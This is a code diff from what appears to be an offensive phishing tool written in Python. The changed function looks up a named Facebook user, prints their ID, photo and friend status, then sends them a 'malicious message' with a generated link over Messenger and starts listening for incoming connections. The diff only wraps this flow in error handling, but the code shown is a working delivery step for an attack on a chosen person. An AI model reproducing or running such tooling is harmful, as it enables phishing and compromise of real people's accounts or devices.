@@ -115,32 +115,39 @@ def sendToMessenger():
 	# and then we just take the first one, aka. the most likely one:
 	color_print("[+] Searching for user " + fbuser, color='blue')
 	global user
-	user = client.searchForUsers(fbuser)[0]
+	try:
+		user = client.searchForUsers(fbuser)[0]
 		
-	if user.name == fbuser:
-		
+		if user.name == fbuser:
+			
 
-		color_print("[+] Found user " + user.name, color='green')
-		time.sleep(2)
-		
-		print('user ID: {}'.format(user.uid))
-		print("user's name: {}".format(user.name))
-		print("user's photo: {}".format(user.photo))
-		print("Is user client's friend: {}".format(user.is_friend))
-		
-		send = raw_input("Do you want to send the malicious message: [Y/n] ")
-		if (send == 'Y' or send == 'Yes' or send == 'yes' or send == 'y'):
+			color_print("[+] Found user " + user.name, color='green')
+			time.sleep(2)
+			
+			print('user ID: {}'.format(user.uid))
+			print("user's name: {}".format(user.name))
+			print("user's photo: {}".format(user.photo))
+			print("Is user client's friend: {}".format(user.is_friend))
+			
+			send = raw_input("Do you want to send the malicious message: [Y/n] ")
+			if (send == 'Y' or send == 'Yes' or send == 'yes' or send == 'y'):
 
-			color_print("[+] Sending malicious message to facebook messenger", color='blue')
-			# Will send a message to the thread
-			global link
-			link = getLink()
-			client.send(Message(text=fbmessage + "\n" + link), thread_id=fbuserID, thread_type=ThreadType.USER)
-			color_print("[+] Message Sent. ", color='blue')
-			listenForConnections()
-		
-	else:
-		color_print("[!] No User found", color='red')
+				try:
+					color_print("[+] Sending malicious message to facebook messenger", color='blue')
+					# Will send a message to the thread
+					global link
+					link = getLink()
+					client.send(Message(text=fbmessage + "\n" + link), thread_id=fbuserID, thread_type=ThreadType.USER)
+					color_print("[+] Message Sent. ", color='blue')
+					listenForConnections()
+				except FBchatFacebookError:
+					color_print("[!] There might be a problem try making sure the facebook ID is correct", color='red')
+			
+		else:
+			color_print("[!] No User found", color='red')
+			return
+	except IndexError:
+		color_print("[!] Something bad happended :(", color='red')
 		return
 #
 # Connects to the smtp server.
